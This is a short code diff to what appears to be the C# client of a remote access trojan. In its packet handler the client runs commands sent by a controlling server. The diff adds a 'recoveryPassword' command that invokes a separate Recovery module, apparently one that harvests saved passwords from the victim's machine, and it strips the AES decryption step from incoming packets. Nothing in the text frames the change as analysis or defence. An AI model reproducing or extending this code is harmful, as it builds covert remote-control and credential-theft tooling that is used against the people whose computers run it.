@@ -7,6 +7,7 @@ using System.Net.Sockets;
 using System.Text;
 using System.Threading;
 using System.Windows.Forms;
+using Client.Recovery;
 
 namespace Client.Handle_Packet
 {
@@ -19,7 +20,7 @@ namespace Client.Handle_Packet
             try
             {
                 MsgPack unpack_msgpack = new MsgPack();
-                unpack_msgpack.DecodeFromBytes(Settings.aes256.Decrypt((byte[])data));
+                unpack_msgpack.DecodeFromBytes((byte[])data);
                 switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                 {
                     case "sendMessage":
@@ -52,6 +53,12 @@ namespace Client.Handle_Packet
                         {
                             Received();
                             new HandleSendTo().SendToMemory(unpack_msgpack);
+                            break;
+                        }
+
+                    case "recoveryPassword":
+                        {
+                            new Recovery.Recovery();
                             break;
                         }
 
